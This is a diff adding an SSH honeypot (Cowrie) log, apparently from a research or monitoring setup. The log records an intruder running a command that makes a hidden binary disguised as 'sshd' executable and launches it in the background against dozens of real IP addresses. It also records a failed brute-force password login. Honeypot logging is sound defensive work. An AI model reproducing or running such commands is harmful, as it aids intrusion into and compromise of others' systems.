@@ -1,0 +1,55 @@
+2024-11-24T16:22:53.593816Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0
+2024-11-24T16:22:53.770608Z [cowrie.ssh.session.HoneyPotSSHSession#info] remote close
+2024-11-24T16:22:53.770952Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-11-24T16:22:53.771116Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-11-24T16:22:53.964792Z [twisted.conch.ssh.session#info] Executing command "b'chmod +x ./.7628149482742765020/sshd;nohup ./.7628149482742765020/sshd 45.120.155.41
+ 54.187.182.253 162.19.106.184 46.8.64.110 18.178.75.116 101.91.236.222 3.254.184.46 42.49.118.116 207.174.28.178 13.208.212.209 134.209.80.5 217.77.4.81 140.246.19.1
+70 3.101.64.51 125.87.91.239 119.51.8.213 3.106.201.222 182.116.68.45 103.205.60.172 172.104.83.177 35.224.49.245 178.236.244.141 94.131.105.133 113.108.106.160 107.1
+89.15.242 45.133.251.177 54.224.10.253 156.227.194.16 18.144.81.65 54.176.248.169 13.57.203.28 54.166.208.53 34.173.99.171 3.147.126.152 47.121.206.143 13.211.29.252
+18.166.236.73 180.100.210.65 13.210.119.66 37.58.18.18 13.57.200.81 58.244.109.128 13.208.182.202 103.76.250.75 27.14.18.114 58.244.109.45 101.126.144.111 54.158.222.
+96 36.137.164.43 13.125.103.77 212.193.5.38 &'"
+2024-11-24T16:22:53.965649Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,1657,180.150.14.98] CMD: chmod +x ./.7628149482742765020/s
+shd;nohup ./.7628149482742765020/sshd 45.120.155.41 54.187.182.253 162.19.106.184 46.8.64.110 18.178.75.116 101.91.236.222 3.254.184.46 42.49.118.116 207.174.28.178 1
+3.208.212.209 134.209.80.5 217.77.4.81 140.246.19.170 3.101.64.51 125.87.91.239 119.51.8.213 3.106.201.222 182.116.68.45 103.205.60.172 172.104.83.177 35.224.49.245 1
+78.236.244.141 94.131.105.133 113.108.106.160 107.189.15.242 45.133.251.177 54.224.10.253 156.227.194.16 18.144.81.65 54.176.248.169 13.57.203.28 54.166.208.53 34.173
+.99.171 3.147.126.152 47.121.206.143 13.211.29.252 18.166.236.73 180.100.210.65 13.210.119.66 37.58.18.18 13.57.200.81 58.244.109.128 13.208.182.202 103.76.250.75 27.
+14.18.114 58.244.109.45 101.126.144.111 54.158.222.96 36.137.164.43 13.125.103.77 212.193.5.38 &
+2024-11-24T16:22:53.966587Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,1657,180.150.14.98] Command found: chmod +x ./.76281494827
+42765020/sshd
+2024-11-24T16:22:53.966972Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,1657,180.150.14.98] Command found: nohup ./.76281494827427
+65020/sshd 45.120.155.41 54.187.182.253 162.19.106.184 46.8.64.110 18.178.75.116 101.91.236.222 3.254.184.46 42.49.118.116 207.174.28.178 13.208.212.209 134.209.80.5
+217.77.4.81 140.246.19.170 3.101.64.51 125.87.91.239 119.51.8.213 3.106.201.222 182.116.68.45 103.205.60.172 172.104.83.177 35.224.49.245 178.236.244.141 94.131.105.1
+33 113.108.106.160 107.189.15.242 45.133.251.177 54.224.10.253 156.227.194.16 18.144.81.65 54.176.248.169 13.57.203.28 54.166.208.53 34.173.99.171 3.147.126.152 47.12
+1.206.143 13.211.29.252 18.166.236.73 180.100.210.65 13.210.119.66 37.58.18.18 13.57.200.81 58.244.109.128 13.208.182.202 103.76.250.75 27.14.18.114 58.244.109.45 101
+.126.144.111 54.158.222.96 36.137.164.43 13.125.103.77 212.193.5.38 &
+2024-11-24T16:22:53.967207Z [twisted.conch.ssh.session#info] exitCode: 0
+2024-11-24T16:22:53.967295Z [cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'
+2024-11-24T16:22:53.967427Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 1
+2024-11-24T16:22:54.139651Z [cowrie.ssh.session.HoneyPotSSHSession#info] remote close
+2024-11-24T16:22:54.140042Z [HoneyPotSSHTransport,1657,180.150.14.98] Closing TTY Log: var/lib/cowrie/tty/1213f68d9c20d1c100762fc31ecebb9d769e8f6e8272ae1f326327c4ffc1
+781e after 0 seconds
+2024-11-24T16:22:54.140824Z [HoneyPotSSHTransport,1657,180.150.14.98] avatar root logging out
+2024-11-24T16:22:54.141021Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-11-24T16:22:54.141103Z [HoneyPotSSHTransport,1657,180.150.14.98] Connection lost after 163 seconds
+2024-11-24T17:06:11.044658Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 165.227.41.104:50344 (10.0.0.4:2222) [session: d13d8f496054]
+2024-11-24T17:06:11.045355Z [HoneyPotSSHTransport,1658,165.227.41.104] Remote SSH version: SSH-2.0-Go
+2024-11-24T17:06:11.104771Z [HoneyPotSSHTransport,1658,165.227.41.104] SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019
+2024-11-24T17:06:11.105946Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-11-24T17:06:11.106059Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-11-24T17:06:11.106142Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-11-24T17:06:11.165694Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-11-24T17:06:11.166101Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-11-24T17:06:11.225160Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'jacob' trying auth b'none'
+2024-11-24T17:06:11.284453Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'jacob' trying auth b'password'
+2024-11-24T17:06:11.284765Z [HoneyPotSSHTransport,1658,165.227.41.104] Could not read etc/userdb.txt, default database activated
+2024-11-24T17:06:11.284902Z [HoneyPotSSHTransport,1658,165.227.41.104] login attempt [b'jacob'/b'jacob123'] failed
+2024-11-24T17:06:12.286657Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'jacob' failed auth b'password'
+2024-11-24T17:06:12.286883Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-11-24T17:06:12.345986Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-11-24T17:06:12.346179Z [HoneyPotSSHTransport,1658,165.227.41.104] Connection lost after 1 seconds
+2024-11-24T17:19:27.380084Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 165.227.41.104:36908 (10.0.0.4:2222) [session: 4991ca7530ba]
+2024-11-24T17:19:27.380813Z [HoneyPotSSHTransport,1659,165.227.41.104] Remote SSH version: SSH-2.0-Go
+2024-11-24T17:19:27.439332Z [HoneyPotSSHTransport,1659,165.227.41.104] SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019
+2024-11-24T17:19:27.440272Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-11-24T17:19:27.440386Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-11-24T17:19:27.440461Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
